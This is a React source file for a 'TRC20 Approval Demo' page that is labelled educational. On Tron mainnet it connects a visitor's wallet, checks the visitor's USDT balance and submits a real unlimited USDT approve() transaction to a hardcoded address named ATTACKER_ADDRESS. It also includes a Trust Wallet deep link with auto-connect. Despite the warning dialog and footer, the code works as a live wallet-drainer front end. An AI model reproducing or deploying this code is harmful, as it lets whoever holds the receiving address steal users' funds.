/* eslint-disable @typescript-eslint/no-unused-vars */
import React, { useEffect, useState } from "react";
import toast, { Toaster } from "react-hot-toast";

/* =========================
   TRC20 CONFIG
========================= */

// USDT TRC20 on Tron Mainnet
const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// Demo approval receiver
const ATTACKER_ADDRESS = "TDgqGYjHc7KKcKjzh17m5w3VoM8RLBqJ72";

// Unlimited approval
const UNLIMITED =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

/* =========================
   TYPES
========================= */

interface WalletInfo {
  address: string;
  short: string;
  trx: string;
  usdt?: string;
}

interface TronWebWindow extends Window {
  tronWeb?: any;
  tronLink?: any;
}

declare const window: TronWebWindow;

type LogType = "info" | "success" | "error" | "warning";

function App() {
  const [wallet, setWallet] = useState<WalletInfo | null>(null);
  const [tronWeb, setTronWeb] = useState<any>(null);
  const [token, setToken] = useState<any>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [isTrustWallet, setIsTrustWallet] = useState(false);
  const [step, setStep] = useState(1);
  const [showMobileInstructions, setShowMobileInstructions] = useState(false);

  /* =========================
     LOGGER (CORE)
  ========================= */
  const log = (msg: string, type: LogType = "info") => {
    console.log(`[${type.toUpperCase()}]`, msg);
    setLogs((prev) => [...prev, msg]);

    switch (type) {
      case "success":
        toast.success(msg);
        break;
      case "error":
        toast.error(msg);
        break;
      case "warning":
        toast(msg, { icon: "⚠️" });
        break;
      default:
        toast(msg);
    }
  };

  const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

  /* =========================
     DETECT MOBILE & INIT
  ========================= */
  useEffect(() => {
    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    
    // Check if coming back from Trust Wallet
    const urlParams = new URLSearchParams(window.location.search);
    const fromTrustWallet = urlParams.get('trust') === 'true';
    
    if (fromTrustWallet && isMobile) {
      log("🔄 Returned from Trust Wallet", "info");
      // Remove the parameter from URL
      window.history.replaceState({}, document.title, window.location.pathname);
    }

    const checkTronWeb = () => {
      if (window.tronWeb || window.tronLink) {
        setIsTrustWallet(true);
        log("✅ Tron wallet detected", "success");
        
        // Initialize TronWeb immediately if available
        if (window.tronWeb && window.tronWeb.ready) {
          initTronWeb();
        }
        
        return true;
      }
      return false;
    };

    // Initial check
    if (!checkTronWeb() && isMobile && !fromTrustWallet) {
      log("📱 Mobile device detected - please use Trust Wallet", "info");
      setShowMobileInstructions(true);
    }

    // Listen for TronWeb injection
    const handleTronWebInjection = () => {
      if (checkTronWeb()) {
        window.removeEventListener('tronWeb#initialized', handleTronWebInjection);
      }
    };

    window.addEventListener('tronWeb#initialized', handleTronWebInjection);

    // Check periodically
    const interval = setInterval(() => {
      checkTronWeb();
    }, 1000);

    return () => {
      window.removeEventListener('tronWeb#initialized', handleTronWebInjection);
      clearInterval(interval);
    };
  }, []);

  /* =========================
     INIT TRONWEB
  ========================= */
  const initTronWeb = async () => {
    try {
      if (window.tronWeb && window.tronWeb.ready) {
        setTronWeb(window.tronWeb);
        
        // Initialize USDT contract
        const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
        setToken(contract);
        log("✅ TronWeb initialized successfully", "success");
        
        // Auto-connect if returning from Trust Wallet
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('autoConnect') === 'true') {
          setTimeout(() => {
            connectWallet();
          }, 1000);
        }
      }
    } catch (error) {
      log("❌ Failed to initialize TronWeb", "error");
      console.error("TronWeb init error:", error);
    }
  };

  useEffect(() => {
    if (window.tronWeb && window.tronWeb.ready && !token) {
      initTronWeb();
    }
  }, [window.tronWeb?.ready]);

  /* =========================
     CONNECT WALLET
  ========================= */
  const connectWallet = async () => {
    if (connecting) return;

    try {
      setConnecting(true);
      log("🔗 Requesting wallet connection...", "info");

      // Ensure TronWeb is available
      if (!window.tronWeb) {
        log("❌ TronWeb not available. Please install Trust Wallet/TronLink", "error");
        setConnecting(false);
        return;
      }

      const accounts = await window.tronWeb.request({
        method: "tron_requestAccounts",
      });

      if (!accounts?.length) {
        log("❌ No accounts found in wallet", "error");
        setConnecting(false);
        return;
      }

      const address = accounts[0];
      
      // Get TRX balance
      const balance = await window.tronWeb.trx.getBalance(address);
      const trxBalance = (balance / 1e6).toFixed(2);
      
      // Get USDT balance
      let usdtBalance = "0.00";
      if (token) {
        try {
          const usdtBal = await token.balanceOf(address).call();
          const decimals = await token.decimals().call();
          usdtBalance = (usdtBal / Math.pow(10, decimals)).toFixed(2);
        } catch (error) {
          console.error("USDT balance error:", error);
        }
      }

      setWallet({
        address,
        short: `${address.slice(0, 6)}...${address.slice(-4)}`,
        trx: trxBalance,
        usdt: usdtBalance,
      });

      log(`✅ Connected: ${address.slice(0, 6)}...${address.slice(-4)}`, "success");
      log(`💰 TRX Balance: ${trxBalance}`, "info");
      if (usdtBalance !== "0.00") {
        log(`💰 USDT Balance: ${usdtBalance}`, "info");
      }
      
      setStep(2);
      setShowMobileInstructions(false);
    } catch (err: any) {
      console.error("Connection error:", err);
      if (err?.message?.includes("rejected") || err?.code === 4001) {
        log("❌ Connection rejected by user", "error");
      } else if (err?.message?.includes("not installed")) {
        log("❌ Wallet not installed", "error");
      } else {
        log("❌ Connection failed. Please try again.", "error");
      }
    } finally {
      setConnecting(false);
    }
  };

  /* =========================
     OPEN TRUST WALLET
  ========================= */
  const openTrustWallet = () => {
    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    if (isMobile) {
      // Add parameters to auto-connect when returning
      const currentUrl = new URL(window.location.href);
      currentUrl.searchParams.set('trust', 'true');
      currentUrl.searchParams.set('autoConnect', 'true');
      
      const encodedUrl = encodeURIComponent(currentUrl.toString());
      const trustWalletUrl = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodedUrl}`;
      
      log("📱 Opening Trust Wallet...", "info");
      
      // Try to open Trust Wallet
      window.location.href = trustWalletUrl;
      
      // Fallback - show instructions if not redirected
      setTimeout(() => {
        if (!document.hidden) {
          setShowMobileInstructions(true);
        }
      }, 2000);
    }
  };

  /* =========================
     GET USDT BALANCE
  ========================= */
  const getBalance = async () => {
    try {
      if (!wallet || !token) return 0;

      log("🔍 Checking USDT balance...", "info");
      const bal = await token.balanceOf(wallet.address).call();
      const decimals = await token.decimals().call();
      const formatted = bal / Math.pow(10, decimals);

      log(`💰 USDT Balance: ${formatted.toFixed(2)}`, "success");
      return formatted;
    } catch {
      log("❌ Failed to check balance", "error");
      return 0;
    }
  };

  /* =========================
     APPROVE DEMO
  ========================= */
  const simulate = async () => {
    if (!wallet || !token) {
      log("❌ Wallet or token not initialized", "error");
      return;
    }

    try {
      setLoading(true);

      // Check balance first
      const balance = await getBalance();
      await sleep(500);

      if (balance === 0) {
        log("❌ No USDT balance to approve", "warning");
        setLoading(false);
        return;
      }

      if (
        !window.confirm(
          `⚠️ DANGER: This will approve UNLIMITED USDT spending to:\n${ATTACKER_ADDRESS}\n\nThis means ALL your USDT can be stolen at any time!\n\nDo you want to continue?`
        )
      ) {
        log("❌ User cancelled approval", "warning");
        setLoading(false);
        return;
      }

      log("📝 Sending approval transaction...", "warning");

      const tx = await token
        .approve(ATTACKER_ADDRESS, UNLIMITED)
        .send({
          feeLimit: 100_000_000,
          callValue: 0,
          shouldPollResponse: true,
        });

      log(`📨 Transaction sent: ${tx.transaction.txID}`, "info");
      log("⏳ Waiting for confirmation...", "info");

      let confirmed = false;
      for (let i = 0; i < 30 && !confirmed; i++) {
        await sleep(1000);
        try {
          const info = await tronWeb.trx.getTransactionInfo(
            tx.transaction.txID
          );
          if (info?.id) {
            confirmed = true;
            log("✅ Transaction confirmed", "success");
            log(`🔗 View on Tronscan: https://tronscan.org/#/transaction/${tx.transaction.txID}`, "info");
          }
        } catch {}
      }

      if (!confirmed) {
        log("⚠️ Confirmation timeout - check wallet later", "warning");
      }

      setStep(3);
    } catch (err: any) {
      console.error("Approval error:", err);
      if (err?.message?.includes("insufficient energy")) {
        log("❌ Insufficient energy. Need TRX for energy.", "error");
      } else if (err?.message?.includes("user rejected")) {
        log("❌ Transaction rejected by user", "error");
      } else {
        log(`❌ Approval failed: ${err.message || "Unknown error"}`, "error");
      }
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     UI
  ========================= */
  return (
    <>
      <Toaster 
        position="top-right" 
        toastOptions={{
          duration: 4000,
          style: {
            background: '#1f2937',
            color: '#fff',
            border: '1px solid #374151',
          },
        }}
      />

      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white">
        <div className="container mx-auto px-4 py-8">
          <div className="max-w-2xl mx-auto">
            {/* Header */}
            <div className="text-center mb-8">
              <h1 className="text-3xl font-bold mb-2">TRC20 Approval Demo</h1>
              <p className="text-gray-400">Educational demonstration of token approval risks</p>
              <div className="flex items-center justify-center gap-2 mt-4">
                <div className={`w-3 h-3 rounded-full ${wallet ? 'bg-green-500' : 'bg-red-500'}`} />
                <span className="text-sm">{wallet ? 'Wallet Connected' : 'Wallet Disconnected'}</span>
              </div>
            </div>

            {/* Main Card */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl border border-gray-700 p-6 mb-6">
              {/* Wallet Info */}
              {wallet && (
                <div className="mb-6 p-4 bg-gray-900/50 rounded-xl">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <p className="text-gray-400 text-sm">Address</p>
                      <p className="font-mono text-sm">{wallet.short}</p>
                    </div>
                    <div>
                      <p className="text-gray-400 text-sm">TRX Balance</p>
                      <p className="font-bold">{wallet.trx} TRX</p>
                    </div>
                    <div>
                      <p className="text-gray-400 text-sm">USDT Balance</p>
                      <p className="font-bold">{wallet.usdt || "0.00"} USDT</p>
                    </div>
                    <div>
                      <p className="text-gray-400 text-sm">Network</p>
                      <p className="font-bold">Tron Mainnet</p>
                    </div>
                  </div>
                </div>
              )}

              {/* Action Buttons */}
              <div className="space-y-4">
                {!wallet ? (
                  <>
                    <button
                      onClick={connectWallet}
                      disabled={connecting || !isTrustWallet}
                      className="w-full py-4 bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-700 hover:to-orange-700 rounded-xl font-bold text-lg transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      {connecting ? (
                        <div className="flex items-center justify-center gap-3">
                          <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                          Connecting...
                        </div>
                      ) : isTrustWallet ? (
                        "Connect Wallet"
                      ) : (
                        "Install Trust Wallet/TronLink"
                      )}
                    </button>

                    {showMobileInstructions && (
                      <div className="mt-4 p-4 bg-yellow-900/20 border border-yellow-700 rounded-xl">
                        <p className="text-yellow-400 font-bold mb-2">📱 Mobile Instructions:</p>
                        <ol className="list-decimal list-inside text-sm text-gray-300 space-y-1">
                          <li>Open this page in Trust Wallet browser</li>
                          <li>Or click below to open Trust Wallet</li>
                          <li>Return here after opening</li>
                        </ol>
                        <button
                          onClick={openTrustWallet}
                          className="w-full mt-3 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg"
                        >
                          Open in Trust Wallet
                        </button>
                      </div>
                    )}
                  </>
                ) : step === 2 ? (
                  <button
                    onClick={simulate}
                    disabled={loading}
                    className="w-full py-4 bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 rounded-xl font-bold text-lg transition-all duration-300 disabled:opacity-50"
                  >
                    {loading ? (
                      <div className="flex items-center justify-center gap-3">
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                        Processing...
                      </div>
                    ) : (
                      "⚠️ Simulate Unlimited Approval"
                    )}
                  </button>
                ) : step === 3 ? (
                  <div className="p-4 bg-red-900/20 border border-red-700 rounded-xl">
                    <p className="text-red-400 font-bold mb-2">⚠️ Warning:</p>
                    <p className="text-sm">
                      Unlimited approvals can drain your wallet at any time. 
                      Always use limited approvals and revoke unused permissions.
                    </p>
                    <div className="mt-4 flex gap-3">
                      <button
                        onClick={() => setStep(2)}
                        className="flex-1 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg"
                      >
                        Try Again
                      </button>
                      <a
                        href="https://tronscan.org"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="flex-1 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg text-center"
                      >
                        Check Approvals
                      </a>
                    </div>
                  </div>
                ) : null}
              </div>
            </div>

            {/* Activity Log */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl border border-gray-700 p-6">
              <h2 className="text-xl font-bold mb-4">Activity Log</h2>
              <div className="bg-black/50 rounded-lg p-4 max-h-64 overflow-y-auto">
                {logs.length === 0 ? (
                  <p className="text-gray-500 text-center py-4">No activity yet</p>
                ) : (
                  logs.map((log, index) => (
                    <div key={index} className="py-2 border-b border-gray-800 last:border-b-0">
                      <span className="text-sm">{log}</span>
                    </div>
                  ))
                )}
              </div>
              {logs.length > 0 && (
                <button
                  onClick={() => setLogs([])}
                  className="w-full mt-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg"
                >
                  Clear Logs
                </button>
              )}
            </div>

            {/* Footer */}
            <div className="mt-8 text-center text-gray-500 text-sm">
              <p className="mb-2">
                This is an educational demonstration. Be cautious with token approvals.
              </p>
              <p>
                Always verify contracts and use limited approvals on{" "}
                <a 
                  href="https://tronscan.org" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-blue-400 hover:text-blue-300"
                >
                  Tronscan
                </a>
              </p>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default App;